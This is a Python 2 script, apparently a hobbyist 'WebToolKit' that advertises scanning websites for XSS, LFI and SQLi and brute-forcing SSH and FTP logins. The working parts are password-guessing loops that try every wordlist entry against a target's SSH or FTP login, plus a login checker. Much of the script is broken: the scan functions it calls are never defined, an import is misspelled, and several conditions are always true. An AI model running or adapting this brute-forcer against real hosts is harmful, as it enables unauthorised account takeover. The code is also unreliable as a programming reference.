#!/usr/bin/python 
# coding: utf-8
#A report will be save in the webtoolkit dir, as 'report.txt'

from sys import *
path.append("files/") 
import time
from URLib2 import *
from optparse import *
import httplib
import socket
import paramiko
from ftplib import FTP

# --> colors
R = "\033[91m"
O = "\033[0m"
G = "\033[32m"
Y = "\033[93m"
B = "\033[94m"
BOLD = "\033[1m"

header = """
=====================================
 _       __     __    __ __ _ ______ 
| |     / /__  / /_  / //_/(°)_  __/ 
| | /| / / _ \/ __ \/ ,<  / / / /    
| |/ |/ /  __/ /_/ / /| |/ / / /     
|__/|__/\___/_.___/_/ |_/_/ /_/      
         Written By Zenix           
=====================================
   -- Webtoolkit for scanning --
   -- and Bruteforce websites --
"""

def version():
    print BOLD + B + "-- WebToolKit written by Zenix" + O
    print BOLD + "-- Version: 1.0" + O
    print BOLD + R + "-- 03/2017" + O
    print BOLD + "------------------------------------------" + O
    print BOLD + "-- Website vuln finder and bruter" + O
    print BOLD + "-- Work with : [LFI/XSS/SQLi/SSH/FTP]" + O
    sys.exit()

def BruteSSH(HOST, USER, WORDLIST):
    print G + "\n[+] Testing passwords..." + O
    try:
        wordlist = open(WORDLIST, "r")
    except IOError:
        sys.exit(R + "\n[-] Error, no such file or directory for wordlist\n" + O)
    for i in wordlist.readlines():
        try:
            PASS = i.strip("\n")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.load_system_host_keys()
            ssh.connect(HOST, port=22, username=USER, password=PASS)
            print G + "[+] Password found : "+PASS + O
            ssh.close()
        except KeyboardInterrupt:
            sys.exit("KeyboardInterrupt")
        except paramiko.AuthenticationException:
            print R + "[-] Password '"+PASS+"'"+" not found."+ O
            pass

def BruteFTP(HOST, USER, WORDLIST):
    print G + "[+] Trying FTP connection on "+HOST+":21" + O
    try:
        wordlist = open(WORDLIST, 'r')
    except IOError:
        sys.exit(R + "\n[-] No such file or directory for wordlist.\n" + O)
    for i in wordlist.readlines():
        try:
            PASS = i.strip("\n")
            ftp = FTP(HOST)
            #ftp.connect(HOST, 21)
            ftp.login(USER, PASS)
            ftp.retrlines('LIST')
            print G + "\n[+] Password found\n[+] User: "+USER+"\n[+] Password: "+PASS + O
            ftp.quit()
        except KeyboardInterrupt:
            ftp.quit("KeyboardInterrupt")
        except:
            print R + "[-] Password '"+PASS+"'" + " not found." + O
            pass

def Hosttest(URL):
    print "[*] Test on "+URL
    try:
        print "\n[*] Checking host: " +URL
        conn = httplib.HTTPConnection(URL)
        conn.connect()
        print G + "\n[+] Host seems up\n" + O
        sys.exit()
    except httplib.InvalidURL:
        sys.exit(R + "\n[!] Error, InvalidURL try to delete http(s) and slashs.\n" + O)
    except KeyboardInterrupt:
        sys.exit(R + "KeyboardInterrupt" + O)
    except (httplib.HTTPResponse, socket.error) as e:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            reqh = socket.gethostbyname(URL)
        except socket.gaierror:
            sys.exit(R + "[-]" + O +" Invalid URL")
        print G +"[+]"+ O +" IP address : "+reqh
        try:
            sock.connect((reqh, 80))
            print G + "\n[+] Host seems up\n" + O
        except socket.error as e:
            sys.exit(R + "[!] Connection error" + O)
        except KeyboardInterrupt:
            sys.exit(R + "KeyboardInterrupt" + O)

def Connection(HOST):
    choice = raw_input("What service do you want to connect :\n1) SSH\n2) FTP\n>>> ")
    if choice == "SSH" or "ssh" or "Ssh":
        USER = raw_input("Username >>> ")
        PASS = raw_input("Password >>> ")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.load_system_host_keys()
            ssh.connect(HOST, port=22, username=USER, password=PASS)
            print G + "[+]"+ O + " Good username and password.\nUser : "+USER+"\nPassword : "+PASS
            ssh.close()
        except KeyboardInterrupt:
            sys.exit("KeyboardInterrupt")
        except paramiko.AuthenticationException:
            print R + "[-]" + O + "Wrong username or password, not connected."
            sys.exit()
    if choice == "FTP" or "ftp" or "Ftp":
        USER = raw_input("Username >>> ")
        PASS = raw_input("Password >>> ")
        try:
            ftp = FTP(HOST)
            #ftp.connect(HOST, 21)
            ftp.login(USER, PASS)
            ftp.retrlines('LIST')
            print G + "[+]"+ O + " Good username and password.\nUser : "+USER+"\nPassword : "+PASS
            ftp.quit()
        except KeyboardInterrupt:
            ftp.quit("KeyboardInterrupt")
        except:
            print R + "[-]" + O + "Wrong username or password, not connected."

def main():

    def errors():
        print  R + "[-]" + O + " Not enough arguments"
        print  R + "[-]" + O + " Type : './wtk.py -h' to see available options\n"
        print BOLD + "-- Usage :" + O
        sys.exit(usage)
    
    usage = R + "./wtk.py [-u] www.test.com [--all]\n./wtk.py [-s] ssh/ftp [-i] 127.0.0.1 [--user] root [-w] wordlist.txt\n./wtk.py [-u] www.test.com [--xss] [--lfi] [--sqli]\n./wtk.py [-u] www.test.com [--proxy] [--dir] [--xss] [etc..]" + O
    parser = OptionParser(usage=usage)
    
    group = OptionGroup(parser, "URL options")
    group.add_option("-u", dest="url", help="Enable URL check.")
    group.add_option("--all", action="store_true", help="Enable all checks on URL.")
    group.add_option("--dir", action="store_true", help="Enable directory check on URL.")
    group.add_option("--xss", action="store_true", help="Enable XSS check on URL.")
    group.add_option("--lfi", action="store_true", help="Enable LFI check on URL.")
    group.add_option("--sqli", action="store_true", help="Enable SQLi check on URL.")
    group.add_option("--uptest", action="store_true", help="Enable Host test on URL.")
    group.add_option("--proxy", action="store_true", help="Enable check with proxy (specify your proxy ip in proxy.txt).")
    parser.add_option_group(group)
    
    group = OptionGroup(parser, "Other options")
    group.add_option("-v", "--version", action="store_true", help="Display infos and version of this program.")
    parser.add_option_group(group)
    
    group = OptionGroup(parser, "BruteForce and connection options")
    group.add_option("-s", dest="service", help="Specify a service for bruteforce [SSH/FTP].")
    group.add_option("-i", dest="host", help="Host specified for bruteforce.")
    group.add_option("--user", dest="username", help="Specify an username to brute or connection")
    #group.add_option("--pass", dest="password", help="Specify password for connection")
    group.add_option("-w", dest="wordlist", help="Set your wordlist for bruteforce")
    group.add_option("--connect", action="store_true", help="Host for connection.")
    parser.add_option_group(group)
    (options, args) = parser.parse_args() 

    ## Variables ##
    URL = options.url
    HOST = options.host
    USER = options.username
    #PASS = options.password
    WORDLIST = options.wordlist
    ## End of Variables ##

    if not (options.url or options.version or options.service):
        errors()

    elif options.url and not (options.dir or options.all or options.sqli or options.uptest or options.xss or options.proxy):
        errors()

    elif options.version:
        version()

    ## Define URL opt here --> ##
     ## URL options with proxy ##

    if options.url and (options.proxy and options.dir):
        Proxydircheck(URL)
    elif options.url and (options.proxy and options.xss):
        p.Xsscheck(URL)
    elif options.url and (options.proxy and options.lfi):
        p.Lficheck(URL)
    elif options.url and (options.proxy and options.sqli):
        p.Sqlicheck(URL)
    elif options.url and (options.proxy and options.uptest):
        p.Hosttest(URL)

     ## URL end proxy options ##

    elif options.url and options.all:
        Dircheck(URL)
        Lficheck(URL)
        Xsscheck(URL)
        Sqlicheck(URL)

    elif options.url and options.dir:
        Dircheck(URL)

    elif options.url and options.xss:
        Xsscheck(URL)

    elif options.url and options.lfi:
        Lficheck(URL)

    elif options.url and options.sqli:
        Sqlicheck(URL)

    elif options.url and options.uptest:
        Hosttest(URL)

    ## End of URL opt <-- ##

    ## BruteForce call fuctions ##

    elif options.service == "ssh" or "SSH" and options.host:
        BruteSSH(HOST, USER, WORDLIST)
    elif options.service == "ftp" or "FTP":       
      BruteFTP(HOST, USER, WORDLIST)

    elif options.host and options.connect:
        Connection(HOST)

    ## BruteForce end options ##

if __name__ == "__main__":
    print header
    main()
